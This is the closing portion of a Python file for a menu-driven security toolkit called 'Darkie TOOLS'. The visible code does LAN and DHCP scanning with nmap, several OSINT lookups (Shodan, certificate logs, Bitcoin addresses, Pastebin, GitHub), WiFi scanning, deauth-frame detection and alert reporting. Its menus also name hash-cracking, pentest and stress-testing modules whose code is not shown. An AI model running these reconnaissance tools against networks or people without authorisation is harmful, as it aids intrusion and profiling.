        except Exception as e: print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    else:
        try:
            cmd = ["arp", "-a"]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10, encoding="utf-8", errors="replace")
            for line in r.stdout.splitlines():
                m = re.search(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+(\S+)', line)
                if m: devices.append((m.group(1), m.group(2)))
                if not m:
                    m = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f-]+)', line.lower())
                    if m: devices.append((m.group(1), m.group(2)))
            for ip, mac in devices:
                print(f"    {c(ip, Fore.GREEN):20s} {c(mac, Fore.CYAN)}")
        except: print(f"  {YELLOW}Install scapy + root for ARP scan, or check arp cache.{RESET}")
    print(f"\n  {c(f'Found {len(devices)} devices', Fore.GREEN)}")
    print()

def net_dhcp_scan():
    header_box("DHCP Scanner", Fore.BLUE)
    print(f"  {c('Scanning for DHCP servers...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    if shutil.which("nmap"):
        try:
            r = subprocess.run(["nmap","-sU","-p","67,68","--open","192.168.0.0/16"], capture_output=True, text=True, timeout=120)
            found = 0
            for line in r.stdout.splitlines():
                m = re.match(r'^(\d+\.\d+\.\d+\.\d+).*open', line)
                if m: print(f"  {c(SYM_CHECK, Fore.GREEN)} {m.group(1)}"); found += 1
            if found == 0: print(f"  {YELLOW}No DHCP servers found.{RESET}")
            else: print(f"\n  {c(f'Found {found} DHCP servers', Fore.GREEN)}")
        except: print(f"  {YELLOW}nmap scan failed.{RESET}")
    else: print(f"  {YELLOW}nmap required for DHCP scan.{RESET}")
    print()

# ──────────────────────────────────────────────────────────
#  MODULE 14: ADVANCED OSINT
# ──────────────────────────────────────────────────────────

def osint_shodan():
    header_box("Shodan Search", Fore.YELLOW)
    query = input(f"  {c(f'Search query {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not query: return
    api_key = input(f"  {c(f'API key (empty for public) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    print(f"\n  {c(f'Searching Shodan: {query}', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    if api_key:
        try:
            r = requests.get(f"https://api.shodan.io/shodan/host/search?key={api_key}&query={query}", timeout=15)
            if r.status_code == 200:
                data = r.json()
                matches = data.get("matches",[])
                print(f"  {c(f'Found {len(matches)} results', Fore.GREEN)}")
                for item in matches[:10]:
                    ip = item.get("ip_str","?"); port = item.get("port","?"); org = item.get("org","?")[:30]
                    print(f"    {c(ip, Fore.GREEN):16s} {c(str(port), Fore.CYAN):6s} {c(org, Fore.YELLOW):30s}")
        except: print(f"  {RED}Error.{RESET}")
    else:
        try:
            r = requests.get(f"https://internetdb.shodan.io/{query}", timeout=10)
            if r.status_code == 200:
                data = r.json()
                print(f"  Ports: {c(str(data.get('ports',[])), Fore.GREEN)}")
                print(f"  Hostnames: {c(str(data.get('hostnames',[])), Fore.CYAN)}")
        except: pass
    print()

def osint_ct_log():
    header_box("Certificate Transparency Log", Fore.YELLOW)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not domain: return
    print(f"\n  {c(f'Searching CT logs for {domain}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15)
        if r.status_code == 200:
            data = r.json()
            print(f"  {c(f'Found {len(data)} certificates', Fore.GREEN)}")
            seen = set()
            for entry in data[:30]:
                name = entry.get("name_value",""); issuer = entry.get("issuer_name","")[:40]
                not_after = entry.get("not_after","")[:10]
                key = f"{name}:{issuer}"
                if key not in seen:
                    seen.add(key)
                    print(f"    {c(name, Fore.GREEN):50s} {c(issuer, Fore.CYAN)} {c(not_after, Fore.YELLOW)}")
    except: print(f"  {RED}Error.{RESET}")
    print()

def osint_btc_lookup():
    header_box("Bitcoin Address Lookup", Fore.YELLOW)
    addr = input(f"  {c(f'Bitcoin address {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not addr: return
    print(f"\n  {c(f'Looking up {addr}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    try:
        r = requests.get(f"https://blockchain.info/rawaddr/{addr}", timeout=15)
        if r.status_code == 200:
            data = r.json()
            balance = data.get("final_balance",0)/100000000
            tx_count = data.get("n_tx",0)
            lines = [f"  Address: {c(addr, Fore.GREEN)}",f"  Balance: {c(f'{balance:.8f} BTC', Fore.YELLOW)}",f"  TX: {c(str(tx_count), Fore.CYAN)}"]
            info_box("Bitcoin Intel", lines, Fore.YELLOW)
    except: print(f"  {RED}Error.{RESET}")
    print()

def osint_pastebin():
    header_box("Pastebin Search", Fore.YELLOW)
    query = input(f"  {c(f'Search term {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not query: return
    print(f"\n  {c('Searching Pastebin...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    try:
        r = requests.get(f"https://www.google.com/search?q=site:pastebin.com+{requests.utils.quote(query)}", timeout=10,
                        headers={"User-Agent":"Mozilla/5.0"})
        urls = re.findall(r'https?://pastebin\.com/\w+', r.text)
        unique = list(set(urls))[:10]
        if unique:
            print(f"  {c(f'Found {len(unique)} results', Fore.GREEN)}")
            for url in unique: print(f"    {c(url, Fore.GREEN)}")
        else: print(f"  {YELLOW}No results.{RESET}")
    except: print(f"  {RED}Error.{RESET}")
    print()

def osint_github_dork():
    header_box("GitHub Dork Search", Fore.YELLOW)
    query = input(f"  {c(f'Search query {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not query: return
    print(f"\n  {c(f'Searching GitHub: {query}', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    try:
        r = requests.get(f"https://api.github.com/search/repositories?q={requests.utils.quote(query)}&per_page=10", timeout=10,
                        headers={"Accept":"application/vnd.github.v3+json"})
        if r.status_code == 200:
            data = r.json()
            items = data.get("items",[])
            total = data.get("total_count",0)
            print(f"  {c(f'Found {total} repos', Fore.GREEN)}")
            for item in items:
                name = item.get("full_name","?")
                desc = (item.get("description") or "")[:50]
                stars = item.get("stargazers_count",0)
                print(f"    {c(name, Fore.GREEN):40s} {c(f'*{stars}', Fore.YELLOW)} {c(desc, Fore.DIM)}")
        else: print(f"  {RED}Error: {r.status_code}{RESET}")
    except: print(f"  {RED}Error.{RESET}")
    print()

def osint_dns_history():
    header_box("DNS History Check", Fore.YELLOW)
    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not domain: return
    print(f"\n  {c(f'Checking DNS history for {domain}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    try:
        r = requests.get(f"https://dnshistory.org/dns-records/{domain}", timeout=10, headers={"User-Agent":"Mozilla/5.0"})
        ips = re.findall(r'(\d+\.\d+\.\d+\.\d+)', r.text)
        if ips:
            print(f"  {c('Historical IPs:', Fore.GREEN)}")
            for ip in set(ips[:10]): print(f"    {c(ip, Fore.GREEN)}")
    except: print(f"  {RED}Could not fetch DNS history.{RESET}")
    print()

def osint_wayback():
    header_box("Wayback Machine Check", Fore.YELLOW)
    url = input(f"  {c(f'URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url: return
    print(f"\n  {c(f'Checking Wayback Machine for {url}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    try:
        r = requests.get(f"https://web.archive.org/cdx/search/cdx?url={url}&output=json&limit=20", timeout=15)
        if r.status_code == 200:
            data = r.json()
            if len(data) > 1:
                print(f"  {c(f'Found {len(data)-1} snapshots', Fore.GREEN)}")
                for row in data[1:15]:
                    timestamp = row[1] if len(row)>1 else "?"
                    original = row[2] if len(row)>2 else "?"
                    status = row[4] if len(row)>4 else "?"
                    print(f"    {c(timestamp, Fore.CYAN)} {c(status, Fore.GREEN)} {c(original[:60], Fore.YELLOW)}")
            else: print(f"  {YELLOW}No snapshots.{RESET}")
    except: print(f"  {RED}Error.{RESET}")
    print()

# ──────────────────────────────────────────────────────────
#  MODULE 15: WIFI & WIRELESS
# ──────────────────────────────────────────────────────────

def wifi_scan():
    header_box("WiFi Network Scanner", Fore.MAGENTA)
    print(f"  {c('Scanning for WiFi networks...', Fore.MAGENTA)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    system = platform.system().lower()
    try:
        if system == "linux":
            r = subprocess.run(["iwlist","scan"], capture_output=True, text=True, timeout=30)
            essids = re.findall(r'ESSID:"(.*?)"', r.stdout)
            signals = re.findall(r'Signal level=(-?\d+)', r.stdout)
            encs = re.findall(r'Encryption key:(on|off)', r.stdout)
            if essids:
                print(f"  {c(f'Found {len(essids)} networks:', Fore.GREEN)}\n")
                for i, essid in enumerate(essids):
                    sig = signals[i] if i < len(signals) else "?"
                    enc_type = "Encrypted" if encs[i] == "on" else "Open"
                    color = Fore.RED if encs[i] == "off" else Fore.GREEN
                    print(f"    {c(f'[{i+1}]', Fore.CYAN)} {c(essid, color):30s} {c(enc_type, Fore.YELLOW):12s} {c(f'{sig}dBm', Fore.CYAN)}")
            else: print(f"  {YELLOW}No networks found.{RESET}")
        elif system == "darwin":
            r = subprocess.run(["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport","-s"],
                             capture_output=True, text=True, timeout=15)
            if r.stdout.strip():
                print(f"  {c('Networks:', Fore.GREEN)}")
                for line in r.stdout.splitlines()[1:]:
                    print(f"    {c(line[:80], Fore.GREEN)}")
            else: print(f"  {YELLOW}No networks or WiFi off.{RESET}")
        elif system == "windows":
            r = subprocess.run(["netsh","wlan","show","networks"], capture_output=True, text=True, timeout=15, encoding="utf-8", errors="replace")
            if r.stdout.strip():
                print(f"  {c('Networks:', Fore.GREEN)}")
                for line in r.stdout.splitlines():
                    if "SSID" in line or "BSSID" in line or "Signal" in line:
                        print(f"    {c(line.strip(), Fore.GREEN)}")
            else: print(f"  {YELLOW}No networks or WiFi off.{RESET}")
    except Exception as e: print(f"  {RED}{SYM_X} Error: {e}{RESET}")
    print()

def wifi_security_audit():
    header_box("WiFi Security Audit", Fore.MAGENTA)
    print(f"  {c('Checking WiFi security...', Fore.MAGENTA)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    system = platform.system().lower()
    issues = []
    try:
        if system == "linux":
            r = subprocess.run(["iwlist","scan"], capture_output=True, text=True, timeout=30)
            essids = re.findall(r'ESSID:"(.*?)"', r.stdout)
            encs = re.findall(r'Encryption key:(on|off)', r.stdout)
            for name, enc in zip(essids, encs):
                if enc == "off":
                    print(f"    {c(SYM_X, Fore.RED)} OPEN: {name}")
                    add_log_alert("WARN","WiFi",f"Open network: {name}")
                    issues.append(name)
                else: print(f"    {c(SYM_CHECK, Fore.GREEN)} Secured: {name}")
        elif system == "windows":
            r = subprocess.run(["netsh","wlan","show","networks","mode=bssid"], capture_output=True, text=True, timeout=15, encoding="utf-8", errors="replace")
            if "Authentication" in r.stdout: print(f"  {c('WiFi info available', Fore.GREEN)}")
    except: pass
    if issues: print(f"\n  {RED}{SYM_WARN} {len(issues)} open networks!{RESET}")
    else: print(f"\n  {GREEN}{SYM_CHECK} All networks secured (or scan failed).{RESET}")
    print()

def wifi_deauth_monitor():
    header_box("Deauth Detection Monitor", Fore.MAGENTA)
    if not _check_root(require_scapy=True): return
    print(f"  {c('Monitoring for deauth frames...', Fore.MAGENTA)}")
    print(f"  {c('Ctrl+C to stop', Fore.YELLOW)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    if not HAS_SCAPY: print(f"  {RED}scapy required.{RESET}"); return
    deauth_count = 0
    start = time.time()
    try:
        def detect_deauth(pkt):
            nonlocal deauth_count
            if pkt.haslayer(scapy.Dot11) and pkt.type == 0 and pkt.subtype == 12:
                deauth_count += 1
                ts = dt.now().strftime("%H:%M:%S")
                print(f"  {c(f'[{ts}]', Fore.RED)} {SYM_WARN} DEAUTH: {pkt[scapy.Dot11].addr2} -> {pkt[scapy.Dot11].addr1}")
                add_log_alert("CRITICAL","Deauth",f"Deauth from {pkt[scapy.Dot11].addr2}")
        scapy.sniff(iface=None, prn=detect_deauth, timeout=30, store=False)
    except KeyboardInterrupt: pass
    except: print(f"  {RED}Error.{RESET}")
    elapsed = time.time() - start
    print(f"\n  {c(f'Done: {deauth_count} deauth frames in {elapsed:.0f}s', Fore.CYAN)}")
    if deauth_count > 0: add_log_alert("WARN","WiFi",f"{deauth_count} deauth frames")
    print()

# ──────────────────────────────────────────────────────────
#  MODULE 16: REPORT GENERATOR
# ──────────────────────────────────────────────────────────

def report_generate():
    header_box("Generate HTML Report", Fore.CYAN)
    if not LOG_ALERTS: print(f"  {YELLOW}No alerts to report.{RESET}"); return
    _ensure_save_dir()
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    report_path = os.path.join(SAVE_DIR, f"report_{ts}.html")
    severity_colors = {"CRITICAL":"#ff0000","HIGH":"#ff6600","WARN":"#ffaa00","INFO":"#00aa00"}
    html = """<!DOCTYPE html><html><head><title>Darkie TOOLS Report</title>
<style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px}
h1{color:#00ffff;border-bottom:2px solid #00ffff}
table{width:100%;border-collapse:collapse;margin:10px 0}
th,td{border:1px solid #333;padding:8px;text-align:left}
th{background:#111;color:#00ffff}
.critical{color:#ff0000;font-weight:bold}
.high{color:#ff6600}.warn{color:#ffaa00}.info{color:#00aa00}
</style></head><body>
<h1>Darkie TOOLS v2.2 - Scan Report</h1>
<p>Generated: """ + dt.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
<p>Total Alerts: """ + str(len(LOG_ALERTS)) + """</p>
<table><tr><th>Timestamp</th><th>Level</th><th>Source</th><th>Message</th></tr>"""
    for alert in LOG_ALERTS:
        level = alert["level"]
        css = level.lower() if level.lower() in severity_colors else "info"
        html += f'<tr><td>{alert["timestamp"]}</td><td class="{css}">{level}</td><td>{alert["source"]}</td><td>{alert["message"]}</td></tr>\n'
    html += "</table></body></html>"
    with open(report_path, "w") as f: f.write(html)
    print(f"  {GREEN}{SYM_CHECK} Report saved: {report_path}{RESET}")
    print(f"  {c(f'Alerts: {len(LOG_ALERTS)}', Fore.CYAN)}")
    print()

def report_export_json():
    header_box("Export Alerts to JSON", Fore.CYAN)
    if not LOG_ALERTS: print(f"  {YELLOW}No alerts.{RESET}"); return
    _ensure_save_dir()
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(SAVE_DIR, f"alerts_{ts}.json")
    with open(path, "w") as f: json.dump(LOG_ALERTS, f, indent=2)
    print(f"  {GREEN}{SYM_CHECK} Saved: {path}{RESET}")
    print()

def report_export_csv():
    header_box("Export Alerts to CSV", Fore.CYAN)
    if not LOG_ALERTS: print(f"  {YELLOW}No alerts.{RESET}"); return
    _ensure_save_dir()
    ts = dt.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(SAVE_DIR, f"alerts_{ts}.csv")
    with open(path, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["timestamp","level","source","message"])
        writer.writeheader(); writer.writerows(LOG_ALERTS)
    print(f"  {GREEN}{SYM_CHECK} Saved: {path}{RESET}")
    print()

# ── Menu functions for new modules ──

def menu_hash_crypto():
    while True:
        header_box("Hash & Crypto Tools", Fore.CYAN)
        print(f"  {c('[1]', Fore.GREEN)}  Hash Generator")
        print(f"  {c('[2]', Fore.GREEN)}  Hash Identifier")
        print(f"  {c('[3]', Fore.GREEN)}  Hash Cracker (Dictionary)")
        print(f"  {c('[4]', Fore.GREEN)}  Encoder / Decoder")
        print(f"  {c('[5]', Fore.GREEN)}  Password Generator")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            {"1":hash_generator,"2":hash_identifier,"3":hash_cracker,"4":encoder_decoder,"5":password_generator}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")

def menu_system_audit():
    while True:
        header_box("System Security Audit", Fore.RED)
        print(f"  {c('[1]', Fore.GREEN)}  Rootkit Detection")
        print(f"  {c('[2]', Fore.GREEN)}  SUID/SGID Scanner")
        print(f"  {c('[3]', Fore.GREEN)}  Cron Job Analyzer")
        print(f"  {c('[4]', Fore.GREEN)}  File Permissions Audit")
        print(f"  {c('[5]', Fore.GREEN)}  Open Ports Summary")
        print(f"  {c('[6]', Fore.GREEN)}  Failed Login Analyzer")
        print(f"  {c('[7]', Fore.GREEN)}  Kernel Hardening Check")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            {"1":audit_rootkit_detection,"2":audit_suid_scanner,"3":audit_cron_jobs,"4":audit_file_permissions,
             "5":audit_open_ports,"6":audit_failed_logins,"7":audit_kernel_hardening}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")

def menu_adv_network():
    while True:
        header_box("Advanced Network", Fore.BLUE)
        print(f"  {c('[1]', Fore.GREEN)}  Port Knocking Tester")
        print(f"  {c('[2]', Fore.GREEN)}  Banner Grabbing")
        print(f"  {c('[3]', Fore.GREEN)}  Reverse Shell Detector")
        print(f"  {c('[4]', Fore.GREEN)}  Network Speed Test")
        print(f"  {c('[5]', Fore.GREEN)}  MAC Address Lookup")
        print(f"  {c('[6]', Fore.GREEN)}  LAN Device Discovery")
        print(f"  {c('[7]', Fore.GREEN)}  DHCP Scanner")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            {"1":net_port_knocking,"2":net_banner_grab,"3":net_reverse_shell_detect,"4":net_speed_test,
             "5":net_mac_lookup,"6":net_lan_discovery,"7":net_dhcp_scan}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")

def menu_adv_osint():
    while True:
        header_box("Advanced OSINT", Fore.YELLOW)
        print(f"  {c('[1]', Fore.GREEN)}  Shodan Search")
        print(f"  {c('[2]', Fore.GREEN)}  Certificate Transparency Log")
        print(f"  {c('[3]', Fore.GREEN)}  Bitcoin Address Lookup")
        print(f"  {c('[4]', Fore.GREEN)}  Pastebin Search")
        print(f"  {c('[5]', Fore.GREEN)}  GitHub Dork Search")
        print(f"  {c('[6]', Fore.GREEN)}  DNS History Check")
        print(f"  {c('[7]', Fore.GREEN)}  Wayback Machine Check")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            {"1":osint_shodan,"2":osint_ct_log,"3":osint_btc_lookup,"4":osint_pastebin,
             "5":osint_github_dork,"6":osint_dns_history,"7":osint_wayback}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")

def menu_wifi():
    while True:
        header_box("WiFi & Wireless", Fore.MAGENTA)
        print(f"  {c('[1]', Fore.GREEN)}  WiFi Network Scanner")
        print(f"  {c('[2]', Fore.GREEN)}  WiFi Security Audit")
        print(f"  {c('[3]', Fore.GREEN)}  Deauth Detection Monitor")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            {"1":wifi_scan,"2":wifi_security_audit,"3":wifi_deauth_monitor}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")

def menu_reports():
    while True:
        header_box("Report Generator", Fore.CYAN)
        print(f"  {c('[1]', Fore.GREEN)}  Generate HTML Report ({c(len(LOG_ALERTS), Fore.YELLOW)} alerts)")
        print(f"  {c('[2]', Fore.GREEN)}  Export to JSON")
        print(f"  {c('[3]', Fore.GREEN)}  Export to CSV")
        print(f"  {c('[b]', Fore.CYAN)}   Back")
        print()
        try:
            ch = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if ch == "b": break
            {"1":report_generate,"2":report_export_json,"3":report_export_csv}.get(ch, lambda: print(f"  {RED}Invalid.{RESET}"))()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"  {RED}{SYM_X} Error: {e}{RESET}")

# ──────────────────────────────────────────────────────────
#  MAIN ENTRY POINT
# ──────────────────────────────────────────────────────────

def main():
    print_banner()
    while True:
        header_box("Darkie TOOLS v2.2 — Ultimate Cyber Toolkit", Fore.CYAN)
        print(f"  {c('[1]', Fore.RED)}    Network & Threat Monitoring")
        print(f"  {c('[2]', Fore.MAGENTA)}  Endpoint Security")
        print(f"  {c('[3]', Fore.BLUE)}   Vulnerability Management")
        print(f"  {c('[4]', Fore.YELLOW)}  Data & Access Protection")
        print(f"  {c('[5]', Fore.GREEN)}   Ethical Hacking & Pentest")
        print(f"  {c('[6]', Fore.CYAN)}   SIEM & Log Analysis")
        print(f"  {c('[7]', Fore.RED)}    Stress Testing")
        print(f"  {c('[8]', Fore.YELLOW)}  OSINT Reconnaissance")
        print(f"  {c('[9]', Fore.MAGENTA)}  Telephone Tools")
        print(f"  {c('[10]', Fore.BLUE)}  Network Utilities")
        print(f"  {c('[11]', Fore.CYAN)}  Hash & Crypto Tools")
        print(f"  {c('[12]', Fore.RED)}   System Security Audit")
        print(f"  {c('[13]', Fore.BLUE)}  Advanced Network")
        print(f"  {c('[14]', Fore.YELLOW)}  Advanced OSINT")
        print(f"  {c('[15]', Fore.MAGENTA)}  WiFi & Wireless")
        print(f"  {c('[16]', Fore.CYAN)}  Report Generator")
        print(f"  {c('[q]', Fore.RED)}    Quit")
        print()

        try:
            choice = input(f"  {c(f'Select module {SYM_PROMPT} ', Fore.CYAN)}").strip()
            if choice == "1": menu_network_threat()
            elif choice == "2": menu_endpoint()
            elif choice == "3": menu_vuln()
            elif choice == "4": menu_data()
            elif choice == "5": menu_pentest()
            elif choice == "6": menu_siem()
            elif choice == "7": menu_stress()
            elif choice == "8": menu_osint()
            elif choice == "9": menu_telephone()
            elif choice == "10": menu_netutils()
            elif choice == "11": menu_hash_crypto()
            elif choice == "12": menu_system_audit()
            elif choice == "13": menu_adv_network()
            elif choice == "14": menu_adv_osint()
            elif choice == "15": menu_wifi()
            elif choice == "16": menu_reports()
            elif choice.lower() == "q":
                print(f"\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
                break
            else:
                print(f"  {RED}Invalid choice.{RESET}")
        except KeyboardInterrupt:
            print(f"\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
            break
        except Exception as e:
            print(f"\n  {RED}{SYM_X} Module error: {e}{RESET}")
            print(f"  {YELLOW}Returning to main menu.{RESET}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {c('Goodbye! Stay secure and ethical.', Fore.GREEN)}\n")
        sys.exit(0)
